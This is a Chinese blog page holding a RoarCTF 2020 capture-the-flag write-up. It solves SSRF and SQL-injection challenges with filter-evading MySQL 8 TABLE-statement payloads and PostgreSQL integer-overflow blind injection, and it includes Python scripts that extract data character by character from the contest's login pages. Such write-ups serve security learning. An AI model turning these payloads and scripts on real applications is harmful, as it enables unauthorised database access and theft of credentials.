@@ -1,0 +1,773 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[RoarCTF2020]wpY1ng是嘶吼的出题人之一，很久以前就在buu群里说这次嘶吼请你吃SQL注入大礼包，我算是吃饱了虽然我都不会做，但是我吃到了超级SQL注入大礼包，注吐了，不过还是学到一点点东西，以及我是SQL注入废物 签到ssrf，先看源码正则匹配过滤flag，但是curl存在二次编码的问题，直接file协议加二次编码绕过读flag ezsql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[RoarCTF2020]wp">
+<meta property="og:url" content="https://blog.z3ratu1.cn/[RoarCTF2020]wp.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="[RoarCTF2020]wpY1ng是嘶吼的出题人之一，很久以前就在buu群里说这次嘶吼请你吃SQL注入大礼包，我算是吃饱了虽然我都不会做，但是我吃到了超级SQL注入大礼包，注吐了，不过还是学到一点点东西，以及我是SQL注入废物 签到ssrf，先看源码正则匹配过滤flag，但是curl存在二次编码的问题，直接file协议加二次编码绕过读flag ezsql">
+<meta property="og:locale">
+<meta property="article:published_time" content="2020-12-05T03:22:31.000Z">
+<meta property="article:modified_time" content="2021-07-06T09:58:24.596Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="SQLI">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/[RoarCTF2020]wp.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>[RoarCTF2020]wp | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/[RoarCTF2020]wp.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [RoarCTF2020]wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-05 11:22:31" itemprop="dateCreated datePublished" datetime="2020-12-05T11:22:31+08:00">2020-12-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-07-06 17:58:24" itemprop="dateModified" datetime="2021-07-06T17:58:24+08:00">2021-07-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/%5BRoarCTF2020%5Dwp.html" class="post-meta-item leancloud_visitors" data-flag-title="[RoarCTF2020]wp" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%5BRoarCTF2020%5Dwp.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%5BRoarCTF2020%5Dwp.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="RoarCTF2020-wp"><a href="#RoarCTF2020-wp" class="headerlink" title="[RoarCTF2020]wp"></a>[RoarCTF2020]wp</h1><p>Y1ng是嘶吼的出题人之一，很久以前就在buu群里说这次嘶吼请你吃SQL注入大礼包，我算是吃饱了<br>虽然我都不会做，但是我吃到了超级SQL注入大礼包，注吐了，不过还是学到一点点东西，以及我是SQL注入废物</p>
+<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>ssrf，先看源码正则匹配过滤flag，但是curl存在二次编码的问题，直接file协议加二次编码绕过读flag</p>
+<h2 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h2><p>测了一下发现username处可以注入，password处注不动，username是admin就会出password error，否则就username error<br>ban了空格和select，空格可以用&#x2F;**&#x2F;直接绕</p>
+<h3 id="盲注跑password"><a href="#盲注跑password" class="headerlink" title="盲注跑password"></a>盲注跑password</h3><p>因为username和password看到在同一张表下，不用select也可以盲注一下password<br><code>username=a&#39;/**/or/**/substr(password,&#123;&#125;,1)=&#39;&#123;&#125;&#39;#</code><br>这里踩了几个坑，第一个是等号后面一开始没用引号。。。。字符串和0比较均为true，导致注入结果奇奇怪怪的，第二个是substr要从1开始，从0会选出一位奇奇怪怪的东西</p>
+<p>不过由于concat是把符合条件的所有列给选出来，所有如果用户表里面存在多个用户的话，上面的盲注可能会导致把别的用户的密码当做admin密码，所以需要再加一个限制条件（这个题就这一个用户，所以就上面这个注入也能注出来）</p>
+<p>这也是第三个坑，concat和group_concat存在一定的区别，本地测试的时候可以<code>select substr(group_concat(password),1,1) from users;</code>这样子是把整个password表用逗号连接起来，而<code>select substr(concat(password),1,1) from users;</code>则是选出了password表每一列的第一个字母，而把payload改成注入格式的<code>select * from users where username=&#39;1&#39; or substr(concat(password),1,1)=&#39;a&#39;;</code>后，group_concat会直接报错，concat还能用</p>
+<p>使用如下payload能指定只注admin的password<br><code>select * from users where username=&#39;1&#39; or substr(concat(username,&#39;,&#39;, password),1,&#123;&#125;)=&#39;&#123;&#125;&#39;</code></p>
+<p>最终跑出来密码是个md5，这也解释了为什么password注不了，放到cmd5里面解密一下，gml666，登录<br>Login success，No flag<br>浪费我感情</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>师傅和我说是堆叠注入，把常见的堆叠语句都ban了<br>prepare execute handler select update insert drop show<br>反正就是一无所有</p>
+<p>先回顾一下堆叠<br>堆叠之前学过的操作就是用set定义一个字符串变量，而字符串变量可以用concat来绕过过滤，再用prepare对字符串进行预处理变成一个statement，execute执行字符串</p>
+<p>handler是MySQL独有的语句，代替select的，功能就是打开一个表，然后返回一个句柄，一行一行读</p>
+<pre><code>handler table_name open;
+handler table_name read first;
+handler table_name reand next;
+</code></pre>
+<p>然而他们都没了<br>吃了个午饭，分号突然也没了？？？还带临时改题的？？？</p>
+<h3 id="MySQL8新操作"><a href="#MySQL8新操作" class="headerlink" title="MySQL8新操作"></a>MySQL8新操作</h3><p>最后还是看MySQL8的全新操作，table语句和value语句<br>按着这个大哥的做法来做<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://0xgeekcat.github.io/%E5%88%A9%E7%94%A8MySQL8%E6%96%B0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87select%E8%BF%87%E6%BB%A4.html">利用MySQL8新特性绕过select过滤</a></p>
+<p>先用上面的盲注可以把db整出来，就叫ctf<br>mysql的查询结果似乎是通过字母顺序排的<br>而ctf这个数据库名开头是c，系统库没有开头是ab的，所以可以使用order by table_schema直接将其排序到第一(以前我一直不知道table_schema存的就是数据库名，虽然有时候有table_schema&#x3D;database()这样的语句但是没仔细想过。。。。)<br>所以<code>TABLE/**/information_schema.tables/**/order/**/by/**/table_schema/**/limit/**/0,1</code>就能取得ctf库的所有信息了<br>本地看一下information_schema.tables都有哪些列<code>show columns from information_schema.tables;</code></p>
+<pre class=" language-mysql"><code class="language-mysql">+-----------------+---------------------+------+-----+---------+-------+
+| Field           | Type                | Null | Key | Default | Extra |
++-----------------+---------------------+------+-----+---------+-------+
+| TABLE_CATALOG   | varchar(512)        | NO   |     |         |       |
+| TABLE_SCHEMA    | varchar(64)         | NO   |     |         |       |
+| TABLE_NAME      | varchar(64)         | NO   |     |         |       |
+| TABLE_TYPE      | varchar(64)         | NO   |     |         |       |
+| ENGINE          | varchar(64)         | YES  |     | NULL    |       |
+| VERSION         | bigint(21) unsigned | YES  |     | NULL    |       |
+| ROW_FORMAT      | varchar(10)         | YES  |     | NULL    |       |
+| TABLE_ROWS      | bigint(21) unsigned | YES  |     | NULL    |       |
+| AVG_ROW_LENGTH  | bigint(21) unsigned | YES  |     | NULL    |       |
+| DATA_LENGTH     | bigint(21) unsigned | YES  |     | NULL    |       |
+| MAX_DATA_LENGTH | bigint(21) unsigned | YES  |     | NULL    |       |
+| INDEX_LENGTH    | bigint(21) unsigned | YES  |     | NULL    |       |
+| DATA_FREE       | bigint(21) unsigned | YES  |     | NULL    |       |
+| AUTO_INCREMENT  | bigint(21) unsigned | YES  |     | NULL    |       |
+| CREATE_TIME     | datetime            | YES  |     | NULL    |       |
+| UPDATE_TIME     | datetime            | YES  |     | NULL    |       |
+| CHECK_TIME      | datetime            | YES  |     | NULL    |       |
+| TABLE_COLLATION | varchar(32)         | YES  |     | NULL    |       |
+| CHECKSUM        | bigint(21) unsigned | YES  |     | NULL    |       |
+| CREATE_OPTIONS  | varchar(255)        | YES  |     | NULL    |       |
+| TABLE_COMMENT   | varchar(2048)       | NO   |     |         |       |
++-----------------+---------------------+------+-----+---------+-------+
+</code></pre>
+<p>共21列，看了一眼本地库的第一项TABLE_CATALOG都是def，而第二项就是库名，第三项就是表名，因此很好构造出一个元组</p>
+<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><p>利用上面大哥链接的对比方法，构造出语句<br><code>(&#39;def&#39;,&#39;ctf&#39;,&#39;&#123;&#125;&#39;,&#39;&#39;,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,&#39;&#39;)&lt;=(TABLE/**/information_schema.tables/**/order/**/by/**/table_schema/**/limit/**/0,1)</code><br>就算order by整出来不是第一个，我就强行遍历limit数据库名能对应ctf应该也没问题吧</p>
+<p>记得匹配的时候要-1，忘了这个试了半天不知道什么情况(具体见文末脚本)<br>跑出来一个表admin，显然是一开始盲注的时候用户名密码那个表</p>
+<p>跑第二个表<br>一开始按ascii码顺序遍历，出现了一堆奇怪的字符导致错误。。。最后按ascii码顺序手打了一个字符集跑出来flag表名为f11114g</p>
+<h3 id="元组对比获取列数"><a href="#元组对比获取列数" class="headerlink" title="元组对比获取列数"></a>元组对比获取列数</h3><p>这个元组比较的做法有一个好处，不需要列名了，直接比较就能打，并且能通过比对项目来判断列数<br>手测列数<br><code>a&#39;||(&#39;&#39;,&#39;&#39;)&lt;=(TABLE/**/f11114g/**/limit/**/0,1))#</code><br>两列直接出username error，所以就一列，列数不一致直接报错</p>
+<pre class=" language-mysql"><code class="language-mysql">mysql> select ('')<('1'); 1 +------------+ | ('')<('1') row in set (0.00 sec) mysql> select ('')<('1',''); 1 1241 error (21000): operand should contain column(s) mysql> select ('','')<('1',''); 1 +------------------+ | ('','')<('1','') row in set (0.00 sec) mysql> select ('','','')<('1',''); 3 1241 error (21000): operand should contain column(s) < code></('1','');></('1','');></('1','');></('1');></code></pre>
+<p>也可以如法炮制的获取列名<br><code>a&#39;||((&#39;def&#39;,&#39;ctf&#39;,&#39;f11114g&#39;,&#39;z&#39;,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,0,0,0)&lt;=(TABLE/**/information_schema.columns/**/order/**/by/**/table_schema/**/limit/**/3,1))#</code>同样需要本地获取一下columns的列数，一开始用的本地mysql5.6的远古环境，得到的列数是19，怎么整都整不对，最后临时拉了一个mysql8.0的docker，发现8.0里面是22列。。。得到f11114g的列就一个，为f1lllaggf<br>但是在用table语句的情况下，这个列名也没锤子用，不需要知道列名，就把f11114g改成f11114gg，再把limit加个1，发现又变成username error就知道只有一列了</p>
+<h4 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h4><p><code>a&#39;||((&#39;&#123;&#125;&#39;)&lt;=binary(TABLE/**/f11114g/**/limit/**/1,1))#</code><br>第一个是个假flag，第二个是真的，记得用binary区分大小写<br>然后字符集还得改一下，因为要往前退一位，所以得加点东西，脚本如下</p>
+<h3 id="注入脚本"><a href="#注入脚本" class="headerlink" title="注入脚本"></a>注入脚本</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://139.129.98.9:30003/login.php"</span>
+payload <span class="token operator">=</span> <span class="token string">""</span>
+charset <span class="token operator">=</span> <span class="token string">"-.0123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZ_`abcdefghijklmnopqrstuvwxyz{|}~"</span>
+
+table_name <span class="token operator">=</span> <span class="token string">""</span>
+
+<span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
+        payload <span class="token operator">=</span> "a<span class="token string">'||(('</span><span class="token punctuation">{</span><span class="token punctuation">}</span>'<span class="token punctuation">)</span><span class="token operator">&lt;=</span>binary<span class="token punctuation">(</span>TABLE<span class="token operator">/</span><span class="token operator">**</span><span class="token operator">/</span>f11114g<span class="token operator">/</span><span class="token operator">**</span><span class="token operator">/</span>limit<span class="token operator">/</span><span class="token operator">**</span><span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#".format(table_name+i)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">}</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            <span class="token comment" spellcheck="true"># print(r.text)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+            table_name <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>
+</code></pre>
+<p>拿到flag</p>
+<p>我是SQL注入垃圾呜呜呜</p>
+<h2 id="你能登陆成功吗"><a href="#你能登陆成功吗" class="headerlink" title="你能登陆成功吗"></a>你能登陆成功吗</h2><p>SQL注入大礼包，我服了，是没见过的postgreSQL，配合express写的，还是没学过的整数溢出注入<br>开局给的hint<code>let PostgreSQL = `SELECT * FROM users WHERE username= &#39;$&#123;username&#125;&#39; AND password= &#39;$&#123;password&#125;&#39;` </code><br>用户名限制死了admin，在password处注入，会回显注入语句，但是没闭合引号就不会回显语句，约等于语句出错不回显语句<br>万能密码登录失败，不知道为什么<br>开始学习整数溢出注入</p>
+<h3 id="整数溢出注入"><a href="#整数溢出注入" class="headerlink" title="整数溢出注入"></a>整数溢出注入</h3><p>也分两种，一种是基于报错回显的整数溢出注入，另一种就是盲注<br>报错回显的如下所示</p>
+<pre class=" language-mysql"><code class="language-mysql">mysql> select ~0;
++----------------------+
+| ~0                   |
++----------------------+
+| 18446744073709551615 |
++----------------------+
+1 row in set (0.00 sec)
+
+mysql> select ~0+1;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + 1)'
+mysql> select !(select*from(select user())x);
++--------------------------------+
+| !(select*from(select user())x) |
++--------------------------------+
+|                              1 |
++--------------------------------+
+1 row in set (0.01 sec)
+
+mysql> select ~0+!(select*from(select user())x); 
+ERROR 1690 (22003): BIGINT value is out of range in '(~(0) + (not((select 'root@localhost' from dual))))'
+</code></pre>
+<p>似乎mysql大于5.5.5才能用，本地5.5.53测试的时候就不行(虽然我感觉这个版本号好像比5.5.5大)，不过报错还是会报，然后换了昨天的mysql8，也不行，前几步都一致，最后报错这步带不出数据</p>
+<pre class=" language-mysql"><code class="language-mysql">mysql> select ~0+!(select*from(select user())x);
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + (0 = (select `x`.`user()` from (select user() AS `user()`) `x`)))'
+</code></pre>
+<p>不过总归报错还报得出来的，虽然今天这个题不是MySQL，但是还是能就基于报错时无回显语句进行一个整数溢出盲注，学习一下语法</p>
+<p>学习完毕，好像这个操作也没什么新颖的，就和普通的bool盲注没什么区别，这里选择它是因为回显只有报错和不报错两种</p>
+<h3 id="payload基本框架构造"><a href="#payload基本框架构造" class="headerlink" title="payload基本框架构造"></a>payload基本框架构造</h3><p>不过需要使用postgresql的语句进行注入，先上官方文档查一下，查出来它的最大整数为9223372036854775807，开始构造语句</p>
+<p><code>password=1&#39;/**/or/**/select(9223372036854775807+(条件)=1)--/**/</code></p>
+<p>postgresql的if是这么写的</p>
+<pre class=" language-mysql"><code class="language-mysql">CASE WHEN condition THEN result
+     [WHEN ...]
+     [ELSE result]
+END
+</code></pre>
+<p>所以条件那写一个<code>case/**/when/**/()/**/then(0)else(1)end</code><br>在when里面做最终判断就行了<br>then 0 else 1要优于then 1 else 0<br>因为选择前者，当你执行结果为真的时候不会报错，执行为假或语句有误的时候产生报错，后者则会导致不知道是<strong>执行结果为真还是语句写错了</strong>导致了报错</p>
+<h3 id="数据库存在判断"><a href="#数据库存在判断" class="headerlink" title="数据库存在判断"></a>数据库存在判断</h3><p>没有太多的过滤内容，就按照postgresql的正常注入顺序就可以了<br><code>(select/**/count(*)/**/from/**/pg_stat_user_tables)/**/between/**/1/**/and/**/1</code><br>判断这个表是不是存在，一般来说是用来确认数据库类型的，不过这里给出了数据库类型</p>
+<p>pg_stat_user_tables和mysql的information_schema比较类似(我也不清楚)</p>
+<h3 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h3><p>再用realname来查询表名</p>
+<p><code>(select/**/ascii(substr(relname,1,1))/**/from/**/pg_stat_user_tables/**/limit/**/1/**/OFFSET/**/0)between/**/32/**/and/**/127</code><br>还要自己写二分。。。太致命了</p>
+<p>翻到了以前写的二分脚本，修修补补就能用，爽死了</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://139.129.98.9:30005/"</span>
+result <span class="token operator">=</span> <span class="token string">""</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p <span class="token operator">=</span> <span class="token number">0</span>
+    q <span class="token operator">=</span> <span class="token number">256</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        m <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">+</span> q<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
+        payload <span class="token operator">=</span> <span class="token string">"1'or(select(9223372036854775807+(case/**/when/**/("</span> \
+                  <span class="token string">"(select/**/ascii(substr(relname,{},1))/**/from/**/pg_stat_user_tables/**/limit/**/1/**/OFFSET/**/0)between/**/{}/**/and/**/127"</span> \
+                  <span class="token string">")/**/then(0)else(1)end))=1)--/**/"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"9223372036854775807"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 条件中结果为真</span>
+            p <span class="token operator">=</span> m
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            q <span class="token operator">=</span> m
+        <span class="token keyword">if</span> p <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">==</span> q<span class="token punctuation">:</span>
+            result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+</code></pre>
+<p>表名users，提示里也有，我就走个流程</p>
+<h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><p>获取列名，用的居然是information_schema，和MySQL一个操作<br><code>(select/**/ascii(substr(column_name,&#123;&#125;,1))/**/from/**/information_schema.columns/**/where/**/table_name=&#39;users&#39;/**/limit/**/1/**/OFFSET/**/0)between/**/&#123;&#125;/**/and/**/127</code><br>列名是id,username,password，提示里也有。。</p>
+<h3 id="查字段"><a href="#查字段" class="headerlink" title="查字段"></a>查字段</h3><p><code>(select/**/ascii(substr(password,&#123;&#125;,1))/**/from/**/users/**/where/**/username=&#39;admin&#39;/**/limit/**/1/**/OFFSET/**/0)between/**/&#123;&#125;/**/and/**/127</code><br>跑出来 Pg5QL1sF4ns1N4T1n9<br>抽象大师，我大概看懂了说的是pgsql is fansinating<br>登录获取flag</p>
+<h2 id="你能登陆成功吗-Revenge"><a href="#你能登陆成功吗-Revenge" class="headerlink" title="你能登陆成功吗-Revenge"></a>你能登陆成功吗-Revenge</h2><p>。就是基于不报错的时候会回显语句这个操作的整数溢出注入是非预期。。。实际上是一个时间盲注，没加过滤，就是无论语句咋样最后都不返回查询语句了<br>postgresql的where和MySQL的不一样，MySQL直接<code>where id=1 or sleep(5)</code>是跑得起来的，而postgresql的where后面必须得是个bool表达式，而其sleep函数pg_sleep()的返回值是void，不行</p>
